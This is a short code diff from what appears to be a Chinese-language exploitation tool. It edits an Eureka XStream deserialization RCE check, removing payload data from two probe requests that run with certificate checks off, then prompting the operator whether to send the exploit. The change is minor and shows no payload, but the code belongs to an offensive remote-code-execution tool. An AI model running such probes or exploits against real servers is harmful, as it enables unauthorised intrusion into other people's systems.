@@ -432,8 +432,8 @@ def Eureka_xstream_RCE(url, proxies, header_new):
         requests.packages.urllib3.disable_warnings()
         urltest1 = url + path1
         urltest2 = url + path2
-        re1 = requests.get(url=urltest1, headers=Headers_1, timeout = outtime, data=payload_1, allow_redirects=False, verify=False, proxies=proxies)
-        re2 = requests.get(url=urltest2, headers=Headers_2, timeout = outtime, data=payload_2, allow_redirects=False, verify=False, proxies=proxies)
+        re1 = requests.get(url=urltest1, headers=Headers_1, timeout = outtime, allow_redirects=False, verify=False, proxies=proxies)
+        re2 = requests.get(url=urltest2, headers=Headers_2, timeout = outtime, allow_redirects=False, verify=False, proxies=proxies)
         if ('eureka.client.serviceUrl.defaultZone' in str(re1.text)) or ('eureka.client.serviceUrl.defaultZone' in str(re2.text)):
             selectd = input("\n[+] 可能存在Eureka_Xstream反序列化漏洞，因该漏洞可能会破坏业务，是否要发送Exploit（Y/N）: ")
             if selectd == '':
@@ -935,5 +935,6 @@ def vul(url, proxies, header_new):
             break
     cprint("后续会加入更多漏洞利用模块，请师傅们敬请期待~", "red")
     sys.exit()
+
 
 
